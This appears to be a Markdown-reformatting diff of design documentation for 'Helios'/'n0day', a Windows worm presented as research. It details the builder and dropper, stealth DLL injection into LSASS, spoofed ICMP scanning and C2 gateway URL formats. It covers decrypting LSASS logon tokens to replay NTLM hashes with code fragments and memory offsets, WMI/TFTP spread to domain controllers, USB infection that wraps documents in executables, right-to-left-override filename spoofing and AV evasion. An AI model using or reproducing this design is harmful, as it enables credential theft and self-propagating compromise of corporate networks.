@@ -6,63 +6,59 @@ Please note that this work is entirely designed for research purposes, and was p
 
 # Main Documentation for Helios
 
-[0]     :Abstract
-[0b]        |-Feature summary
+1.      :Abstract
+2.        |-Feature summary
 
-[1]     :Building and Input
-[1b]        |-Builder parameters
-[1c]        |-Builder output
-[1d]        |-URL List format
+3.      :Building and Input
+4.        |-Builder parameters
+5.        |-Builder output
+6.        |-URL List format
 
-[2]     :Local Propagation
-[2b]        |-Binary structure
-[2c]        |-Injection
-[2ca]           |-x86 to x64 Injection
-[2d]        |-Process Synchronization
+7.      :Local Propagation
+8.        |-Binary structure
+9.        |-Injection
+10.       |-x86 to x64 Injection
+11.       |-Process Synchronization
 
-[3]     :Network Discovery
-[3b]        |-Passive network scanner
-[3c]        |-Dynamic URL detection
+12.     :Network Discovery
+13.       |-Passive network scanner
+14.       |-Dynamic URL detection
 
-[4]     :Worming Payload
-[4b]        |-URL List updating
-[4c]        |-Gateway cycling
+15.     :Payload
+16.       |-URL List updating
+17.       |-Gateway cycling
 
-[5]     :Intranet Propagation
-[5b]        |-Hash Replay
-[5ba]           |-Algorithm
-[5bb]           |-NT6.0+ and NT5 Differences
-[5d]        |-WMI
-[5e]        |-tftp
-[5f]        |-Token structures
-[5fa]           |-NT6.0+ Decryption
-[5fb]           |-Token Decryption
+18.     :Intranet Propagation
+19.        |-Hash Replay
+20.             |-Algorithm
+21.             |-NT6.0+ and NT5 Differences
+22.         |-WMI
+23.         |-tftp
+24.         |-Token structures
+25.             |-NT6.0+ Decryption
+26.             |-Token Decryption
 
-[6]     :USB Propagation
-[6b]        |-PE Infector
-[6c]        |-Wrapper Overview
-[6ca]           |-
-[6cb]           |-Binary Structure
-[6cd]           |-RTO, datetime and extension mangling
+27.      :USB Propagation
+28.         |-PE Infector
+29.         |-Wrapper Overview
+30.             |-
+31.             |-Binary Structure
+32.             |-RTO, datetime and extension mangling
 
-[7]     :Wrapper Spearphishing Tool
-[7b]        |-Command Line
-[7c]        |-Packing
+33.      :Wrapper Spearphishing Tool
+34.         |-Command Line
+35.         |-Packing
 
+## Release Version: 1.0.0
 
-===================================================================================================
-
-
-Release Version: 1.0.0
-
-+ add WEBDAV stuff in Product description
-+ remake TOC
-+ scan_net() must not return after subnet is exhausted
-+ randomize ICMP payload
-+ Spoof ICMP source 
+..* add WEBDAV stuff in Product description
+..* remake TOC
+..* scan_net() must not return after subnet is exhausted
+..* randomize ICMP payload
+..* Spoof ICMP source 
 
 
-====[0] [Abstract]=================================================================================
+## Abstract
 
     
     In response to the evident awakening of the software security industry, 
@@ -91,38 +87,34 @@ Release Version: 1.0.0
 
 
 
-====[0] [Abstract]=================================================================================
-    [0b]Feature Summary
+## Abstract
+### Feature Summary
 
     n0day general features. Please refer to [5a] for details on attack vectors.
 
 Systems Support:
-    [+] x86 Support (x64 is planned on next release)
-    [+] Tested on Windows XP (all SPs), Vista, Windows 7 
-    [+] MS Server OS support: Server 2003, Server 2008, Server 2008 R2
+    ..* x86 Support (x64 is planned on next release)
+    ..* Tested on Windows XP (all SPs), Vista, Windows 7 
+    ..* MS Server OS support: Server 2003, Server 2008, Server 2008 R2
 
 Local Presence:
-    [+] Nothing written to the disks
-    [+] Stealth DLL injection into any process
-    [+] 
+    ..* Nothing written to the disks
+    ..* Stealth DLL injection into any process 
 
 Network Presence:
-    [+] Silent and passive network scanner
-    [+] Propagation via TFTP
-    [+] Optimized to target Domain Controllers (DCs)
+    ..* Silent and passive network scanner
+    ..* Propagation via TFTP
+    ..* Optimized to target Domain Controllers (DCs)
 
 Security:
-    [+] Test for process tampering in memory 
-    [+] Gateway URL list encryption
+    ..* Test for process tampering in memory 
+    ..* Gateway URL list encryption
 
 Vectors:
-    [+] LSA Token Manipulation (nTM)
-    [+] Silent USB infection
+    ..* LSA Token Manipulation (nTM)
+    ..* Silent USB infection
 
-    
-
-
-====[1] [Building and Input]=======================================================================
+## Building and Input
 
     The n0day builder (n0day.builder.exe) generates a PE executable which contains
 a dropper, gateway configuration segment and the worming DLL. The gateway 
@@ -140,11 +132,7 @@ segment of the dropper. The builder encrypts the configuration segment and appen
 it to the core DLL in the same
 way.
 
-
-
-
-====[1] [Building and Input]=======================================================================
-    [1b] Builder Parameters
+### Builder Parameters
 
     The builder reads parameters statically, so the parameters cannot be 
 mismatched. The builder also requires that each parameter be present.
@@ -206,6 +194,7 @@ Parameters:
 
 Example:
 
+```
 builder.exe -u gateway_list.txt
             -d webdav_list.txt
             -a 666
@@ -222,6 +211,7 @@ builder.exe -u gateway_list.txt
             -r 75                       (3/4th of the Docs are wrapped)
             -t 30                       (Only documents accessed within the last 30 days are noticed)
             -p 50                       (Half/half chance that the .PIF extension will be used)
+```            
 
 
     As noted before, the parameters must be in order. Each parameter must exist. 
@@ -230,9 +220,7 @@ Finally, the Gateway URL (-u) and WEBDAV URL lists can be the same file.
     There parameters will be passed down to the USB infector and wrapper mechanisms.
 The DLLs will need to be rebuilt once a new combination of these options is needed.
 
-
-====[1] [Building and Input]=======================================================================
-    [1c] Builder Output
+### Builder Output
     
     Before the a payload from the Gateway is requested, a URL must be generated 
 which specifies the worm checksum. This checksum looks for any modifications in 
@@ -243,27 +231,25 @@ An ASCII string containing a SHA-1 checksum will be output upon successful execu
 
 For example:
 
-    sum: 484455183745fc5561ed7fd91db1c704958e568f
+    ```sum: 484455183745fc5561ed7fd91db1c704958e568f```
 
 
-====[1] [Building and Input]=======================================================================
-    [1d] URL List format
+### URL List Format
 
     This section applies to both the Gateway URL list and the WEBDAV URL list. 
 The text file should be in plaintext, encoded using standard ASCII symbols. If the 
 list is malformed, crashes will definitely occur.
-
 
 Example URLs:
 
 http://www.google.com:80/gateway/
 http://10.0.0.1:8080/
 
-    [+] "http://" must always be specified
-    [+] Domain must not include a sub-subdomain (aka a.www.b.com)
-    [+] Port must always be specified
-    [+] The trailing "/" must be included
-    [+] Do not include an extra carriage return after the last entry
+    ..* "http://" must always be specified
+    ..* Domain must not include a sub-subdomain (aka a.www.b.com)
+    ..* Port must always be specified
+    ..* The trailing "/" must be included
+    ..* Do not include an extra carriage return after the last entry
     
     
     Webdav List format
@@ -274,10 +260,7 @@ http://webdav-server/folder/file.exe
     [+] Do not include the port number (predefined for WebDAV)
     [+] Specify the file name and extension
     
-    
-    
-
-====[2] [Local Propagation]========================================================================
+## Local Propagation
 
     The built binary should be executed as UAC administrator for maximum 
 effectiveness. The dropper code will extract the core DLL from the 
@@ -322,11 +305,7 @@ dispatcher will take the following actions:
     If n0day does not run in LSASS, it will call replicate_dll_thread()
 which will attempt to inject into the target processes.
     
-
-
-
-
-====[3] [Network Discovery]========================================================================
+## Network Discovery
 
     If code is injected into LSASS, the DLL starts the scan_net() thread. 
 scan_net will update ip_address_list, that is read by get_random_address_from_pool(...).
@@ -335,8 +314,7 @@ functions available in ring 3.
 
 Here is the basic function call and thread map:
 
-
-                     
+```                     
          thread_dispatcher()
                  |
   --------------------------------
@@ -350,7 +328,7 @@ get_rand_address()            update
       ---------mutex--------------
                  |
       (PDWORD)ip_address_list
-
+```
 
 
     scan_net() threads begins by allocating memory for the used_address_pool,
@@ -377,9 +355,7 @@ addresses that are not pinged by the scanner are stored in the cache. There is
 a small delay between calls to IcmpSendEcho2Ex(...), so the average time it 
 takes to scan a class C network (253) hosts is approximately 1-3 minutes.   
 
-
-    
-====[4] [Worming Payload]==========================================================================
+## Payload
 
     n0day does not contain any payload, nor does it write anything to the disks.
 If n0day gains control of the local machine (SYSTEM authority), it will create a 
@@ -394,11 +370,13 @@ will begin worming.
 encrypted and stored as data in the last segment of the core DLL. The last segment
 prior to encryption is given:
 
+```
 [Offset]        [Data]
 0               (DWORD) Key
 4               (DWORD) Attack ID
 8               (DWORD) Campaign ID
 0c              (...)
+```
 
     At 0c, the Gateway URL exists, seperated by carriage return and new line bytes.
 The list follows a NULL, followed by the WEBDAV URL list, written in the same way.
@@ -406,7 +384,7 @@ The list follows a NULL, followed by the WEBDAV URL list, written in the same wa
     The encryption algorithm is a basic XOR & bit shift, using a 32-bit Key.
     
     
-                                    ***
+------------------------------------------------------------------------------------
                                     
                                     
     The n0day payload updater reaches the Gateway server through the list specified
@@ -416,9 +394,7 @@ to this:
 
     http://google.com:80/gateway/gate.php?a=$attack_id&w=$campaign_id&c=$sha1sum
     
-    
-
-====[5] [Intranet Propagation]=====================================================================
+## Intranet Propagation
 
     The n0day worm is designed to attack critical machines on a Microsoft
 domain infrastructure. The n0day Token Manipulation (nTM) technique is not 
@@ -443,11 +419,7 @@ or application communication.
 can be impersonated without any password or username. The nTM technique exploits
 this Microsoft "feature" to propagate through the network.
 
-
-
-
-====[5] [Intranet Propagation]=====================================================================
-    [5b] Hash Replay (n0day Token Manipulator - nTM)
+## Hash Replay (n0day Token Manipulator - nTM)
 
     Once the n0day DLL is loaded into lsass.exe, it attempts to locate all
 existing logon/session tokens. The nTM engine replays hashes by creating a
@@ -459,6 +431,7 @@ password and search for the hashed password in memory. So windows will create
 a token with the correct user, domain and session of the impersonated token, 
 but with an incorrect NTLM. 
 
+```
 CreateProcessWithLogonW(    real_token.user,            // This user exists
                             real_token.domain,          // The domain is correct
                             L"dummy_password",          // Password is wrong
@@ -470,8 +443,9 @@ CreateProcessWithLogonW(    real_token.user,            // This user exists
                             NULL,
                             &startup_info,
                             &process_info)
+```                            
                             
-If L"dummy_password" is 694f128428be20229cfd00186281a34a, for example, then nTM
+If `L"dummy_password"` is `694f128428be20229cfd00186281a34a`, for example, then nTM
 will look for that hash and determine that this is the token it must inject into.
 Just to note, the password specified is always converted into wchar_t (Wide 
 characters, 2 bytes per) before calling the NTLM hashing subroutine.
@@ -491,8 +465,9 @@ on each machine. A network wide spread will then occur.
                                     ***
                                     
     When a token in LSASS memory is found, it is decypted and stored into the
-NTLM_TOKEN structure.
+`NTLM_TOKEN` structure.
 
+```
 typedef struct ntlm_token {
     DWORD               *raw_token; 
     DWORD               *decrypted_token;
@@ -504,6 +479,7 @@ typedef struct ntlm_token {
     HANDLE              heap;
     DWORD               *original_decrypted_token;
 } NTLM_TOKEN, *PNTLM_TOKEN;
+```
 
     Each NTLM_TOKEN instance exists in its own heap space. sizeof(NTLM_TOKEN) is 
 zero'd and the NTLM_TOKEN.heap field is pointed to the structure heap. 
@@ -512,11 +488,7 @@ NTLM_TOKEN.primary_string points to the 'Primary' string (refer to [5f]).
 The ntlm, session, domain and user variables all point to the decrypted_token,
 which is mapped by the NTLM_TOKEN.heap handle.
 
-
-
-
-====[5] [Intranet Propagation]=====================================================================
-    [5ba] Algorithm
+## Algorithm
 
     nTM is optimized for session hijacking. It will also prefer to target
 domain controllers. Obviously, access to a domain controller is golden, so more 
@@ -588,11 +560,7 @@ IP addesses from the passive scanner. This will ensure that the worm will work
 until all machines have been infected. If the tokens that exist on the system are
 of limited permissions, nTM will keep trying until access is granted.
 
-
-
-
-====[5] [Intranet Propagation]=====================================================================
-    [5bb] NT6.0+ and NT5 Differences
+## NT6.0+ and NT5 Differences
     
     The same algorithm is taken by both OSs, but there are a few differences between
 Windows XP and Windows 7 token storage. nTM finds the encrypted tokens by searching
@@ -605,8 +573,9 @@ hints table, which is then stored in heap memory. Token objects are decrypted us
 call to LsaEncryptMemory(...), in lsasrv.dll. This function will access the hint tables
 and decrypt a block of memory. 
 
-LsaEncryptMemory prototype and signature
+`LsaEncryptMemory` prototype and signature
 
+```
 void (WINAPI *LsaEncryptMemory)(unsigned int *, // Pointer to buffer
                                 unsigned int,   // Size of buffer
                                 unsigned int)   // Mode. 1=encrypt, 0=decrypt
@@ -621,7 +590,7 @@ void (WINAPI *LsaEncryptMemory)(unsigned int *, // Pointer to buffer
 .text:7573FDFD 118 8B 75 08                mov     esi, [ebp+arg_0]
 .text:7573FE00 118 85 F6                   test    esi, esi
 .text:7573FE02 118 89 45 FC                mov     [ebp+var_4]
-
+```
 
     In XP, the LsaEncryptMemory function is identified in memory through the function
 prologue. Utilizing this function allows nTM to decrypt/encrypt any token in memory.
@@ -633,8 +602,9 @@ secret in lsasrv heap memory and generates a symmetric DESX-CBC key from it. The
 are then used to perform encryption on the tokens.
 
     Furthermore, Windows XP uses the Advapi32.dll exports LogonUser(...) and 
-CreateProcessAsUser(...) to create the husk process. 
+`CreateProcessAsUser(...)` to create the husk process. 
 
+```
 LogonUser(  real_token.user,
             real_token.domain,
             PLAINTEXT_PASS,
@@ -653,13 +623,12 @@ CreateProcessAsUser(    token,
                         NULL,
                         &startup_info,
                         &process_info);
+```                        
                         
-    nTM running on Vista+ calls CreateProcessWithLogon(...), which is a more flexible
+    nTM running on Vista+ calls `CreateProcessWithLogon(...)`, which is a more flexible
 function but does the same thing.
 
-
-    
-[5d]    WMI & TFTP
+## WMI & TFTP
 
     When the husk process recieves a GO from nTM to begin infection, it reads a registry 
 key (specified in n0day.core.dll main.h) which contains an IP address of the remote machine.
@@ -702,11 +671,7 @@ The husk follows this procedure:
     =>  The payload will be executed through WMI and the husk will return SUCCESS.
             The target machine is marked as infected.
 
-
-            
-            
-====[5] [Intranet Propagation]=====================================================================
-    [5f] Token structures
+## Token Structures
 
     The Local Security Authority Subsystem Service (LSASS) was rigerously reversed
 to determine how the process handles token creation, validation and removal.
@@ -720,7 +685,7 @@ There are many instances, some will not be a token.
 
 Example encrypted token
 
-
+```
 [Address]   [Data]          [Offset]        [Notes]
 0x00230000  0c 00 23 00     0               Contains a pointer to 'Primary'
 0x00230004  0f a2 00 00     4           
@@ -731,7 +696,7 @@ Example encrypted token
 0x00230018  xx xx xx xx     24
 0x0023001c  xx xx xx xx     28
 0x00230020  xx xx xx xx     32
-
+```
 
 
     At offset 0, we have a DWORD which is an address, 0x0023000c. This address 
@@ -745,16 +710,16 @@ contains sensitive session information, it is 0x70 in size.
 
 
                                     
-    If the local machine is Windows XP, then a call to LsaEncryptMemory(...) is 
+    If the local machine is Windows XP, then a call to `LsaEncryptMemory(...)` is 
 sufficient to decrypt the token. In Windows Vista+, the bcrypt library creates 
 handles to its symmetric keys, which will be difficult to locate. Fortunately,
 Microsoft keeps the secret, a 24-byte value, which can be used to generate a new
 symmetric key, in memory. 
 
-    nTM reads all pages allocated with MEM_PRIVATE for a DWORD value of 0x55555552,
-or RUUU. Here is an example:
+    nTM reads all pages allocated with `MEM_PRIVATE` for a DWORD value of `0x55555552`,
+or `RUUU`. Here is an example:
 
-
+```
 004B0000  00000014 0
 004B0004  55555552 4    Our initial string, RUUU (0x55555552)
 004B0008  0028C2C8 8
@@ -779,7 +744,7 @@ or RUUU. Here is an example:
 004B0054  5424C874 84
 004B0058  4FC1460A 88
 004B005C  1450C4A0 92
-
+```
 
 
     In NT6.1, the key is located at 0x3c relative to -0x04 of 'RUUU'. In NT6.0,
@@ -787,22 +752,19 @@ the same thing applies except the key is located at 0x2c. In both cases, the
 key is 24 bytes in length. The key cannot contain a NULL byte, this is checked by
 LSASS.
 
-
-
-====[5] [Intranet Propagation]=====================================================================
-    [5fa] NT6.0+ Decryption
+## NT6.0+ Decryption
 
     Once nTM has obtained the secret, it must generate a symmetric key and decrypt
-the token. BCRYPT_3DES_ALGORITHM is specified in BCryptOpenAlgorithmProvider(...).
+the token. BCRYPT_3DES_ALGORITHM is specified in `BCryptOpenAlgorithmProvider(...)`.
 The chaining mode, in this case CBC (BCRYPT_CHAIN_MODE_CBC) is applied by calling
-BCryptSetProperty(...). 
+`BCryptSetProperty(...)`. 
 
-    Next, a call to BCryptGenerateSymmetricKey(...) returns the handle to the 
+    Next, a call to `BCryptGenerateSymmetricKey(...)` returns the handle to the 
 key object. The Initialization Vector is an 8 byte cryptographic primitive, which 
 increases the entropy of the block cipher. Windows zero's this value before calling
-BCryptDecrypt(...).
+`BCryptDecrypt(...)`.
 
-
+```
 BCryptDecrypt(  key_handle,
                 (PUCHAR)local_token->raw_token,
                 NTLM_TOKEN_6_SIZE,
@@ -813,21 +775,17 @@ BCryptDecrypt(  key_handle,
                 NTLM_TOKEN_6_SIZE,
                 (PULONG)&junk,
                 0); 
-    
+```    
     
                 
     The result decrypted buffer is stored in local_token->decrypted_token. The
 encryption handlers are closed and nTM processes the decrypted token.
 
-
-
-
-====[5] [Intranet Propagation]=====================================================================
-    [5fb]Token Decryption
-
+## Token Decryption
 
     n0day identifies several important offsets in the decrypted token:
-    
+ 
+``` 
 007B05B8  0D614380  €Ca.    00      Base (after 'Primary')
 007B05BC  97AD4B10  K­—     04
 007B05C0  00140012  ....    08
@@ -858,7 +816,7 @@ encryption handlers are closed and nTM processes the decrypted token.
 007B0624  00540053  S.T.    108
 007B0628  00000024  $...    112
 007B062C  00000000  ....    116
-
+```
     
     In this instance, nTM will notice a zero'd NTLM field. This implies that the 
 token is probably a local session, which is unrecognized by the domain authority.
@@ -868,13 +826,11 @@ It is sufficient to impersonate a user by modifying the Session and NTLM fields.
 token cannot exceed 0x70 bytes in size. The user name is always a wchar_t string
 pointed by:
 
-(wchar_t *)((DWORD)decrypted_token + *(PDWORD)((DWORD)decrypted_token + 0x0c))
+`(wchar_t *)((DWORD)decrypted_token + *(PDWORD)((DWORD)decrypted_token + 0x0c))`
 
-    
-====[6] [USB Propagation]==========================================================================
-    [6b] PE Infector
-    
-    [6c] Wrapper Overview
+## USB Propagation
+### PE Infector
+#### Wrapper Overview
         
     The Helios Wrapper aims to combine numerous social engineering tricks with
 a USB infection vector. Users frequently distribute corporate documents by means 
@@ -882,7 +838,7 @@ of removable USB drives. The Wrapper locates these files and "wraps" a PE execut
 around them, allowing the Helios worm to spread. The PE itself is a downloader for the 
 KR3PE payload.
 
-    [6ca] Structure
+#### Structure
     
     Since the Wrapper is generating executable PEs, binary encryption must be ensured.
 This will be explained in detail later on. Also, the PE must be generated to mimic the 
@@ -895,7 +851,7 @@ downloader will continue its work while the User can safely modify the document.
 downloader PE will then attempt to reach a gate via webdav. If a gate is successfully 
 reached, the payload will be executed, and the PE will delete itself.
 
-    [6cb] Generation procedure
+#### Generation procedure
     
     Initially, the CORE32/CORE64 Helios worm DLLs must be generated, specifying the 
 gateway lists. Before these DLLs are pushed onto client machines, a wrapper 'skeleton'
@@ -908,35 +864,35 @@ binary cannot be detected by AV. Since it is only a matter of time before crypte
 instances are detected, the Corona panel can be instructed to create a new instance
 of the skeleton when required.
 
-    [6cc] Wrapper Algorithm
+#### Wrapper Algorithm
     
     Once all binaries are built, Helios may be pushed onto the client systems. Here is
 an algorithmic outline of how a file is infected:
 
 
-    1) CORE32/CORE64 DLLs are loaded into explorer.exe
+    1. CORE32/CORE64 DLLs are loaded into explorer.exe
     
-    2) The DLL waits until a USB device is plugged into the system (note:
+    2. The DLL waits until a USB device is plugged into the system (note:
         the DLL will also look for writable network drives, and any other
         removable media)
         
-    3) Once a victim document is found, the DLL attempts to reach a gate
+    3. Once a victim document is found, the DLL attempts to reach a gate
         in order to download the latest skeleton file, initially generated
         by the skeleton builder.
         
-    4) Next, the document is removed from the disk and appeneded to the
+    4. Next, the document is removed from the disk and appeneded to the
         skeleton.
         
-    5) The document is encrypted.
+    5. The document is encrypted.
     
-    6) An icon is loaded into the resource segment of the PE, respective to
+    6. An icon is loaded into the resource segment of the PE, respective to
         the file extension of the document.
         
-    7) The PE is written to the disk.
+    7. The PE is written to the disk.
     
-    8) RTO is applied to the extension.
+    8. RTO is applied to the extension.
     
-    [6cd] RTO
+### RTO
     
     RTO, or the Right-to-left Override trick is a feature of MS Windows that
 allows files to be named in Arabic languages. This is especially useful in
@@ -949,3 +905,5 @@ expected extension. For instance:
     
     This tricks works on all modern Windows OSs, without the need of an Arabic
 or any other non-standard language pack.
+
+ALL WORK IS FOR RESEARCH AND EDUCATIONAL PURPOSES ONLY! stan [dot] ruzin [at] gmail [dot] com
